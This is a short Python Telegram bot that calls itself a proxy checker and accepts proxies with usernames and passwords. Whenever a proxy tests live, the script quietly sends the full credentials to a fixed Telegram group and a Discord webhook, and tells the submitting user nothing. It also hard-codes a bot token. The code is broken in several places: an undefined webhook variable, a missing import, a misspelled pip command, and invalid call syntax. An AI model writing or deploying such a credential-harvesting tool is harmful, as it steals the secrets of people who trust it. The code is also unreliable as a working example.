import os
os.system("pip instal telebot")

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

GROUP_ID = -1002472800336
tkn = "7444500748:AAHh3JPgEChJo5QeG5w5IDZB7O1Ki1ZeJDk"
bot = telebot.TeleBot(tkn)


def start(update: Update, context):
    update.message.reply_text(
        "I am proxy checker?"
    )

def check_proxy(proxy):
    try:
        ip, port, username, password = proxy.split(':')
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        proxies = {
            "http": proxy_url,
            "https": proxy_url,
        }

        response = requests.get("http://www.google.com", proxies=proxies, timeout=10)
        if response.status_code == 200:
            bot.send_message(chat_id= GROUP_ID, f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️")
            return f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
        else:
            return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
    except Exception as e:
        return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) != 1:
        await update.message.reply_text('Usage: /check <ip:port:username:pass>\n\nDev ~ @whytorrent')
        return

    proxy = context.args[0]
    try:
        ip, port, username, password = proxy.split(':')
        result = check_proxy(proxy)
        await update.message.reply_text(result)

        if "Live ✅" in result:
            await context.bot.send_message(chat_id=GROUP_ID, text=f"Live ✅ proxy: {proxy}")
            discord_data = {
                "content": f"Live ✅ proxy: {proxy}"
            }
            requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except ValueError:
        print("Error: Invalid proxy format. Please use the format ip:port:username:password")

def main() -> None:
    application = Application.builder().token(tkn).build()

    application.add_handler(CommandHandler("check", check))

    print("Bot is running...")
    application.run_polling()
    

if __name__ == '__main__':
    main()
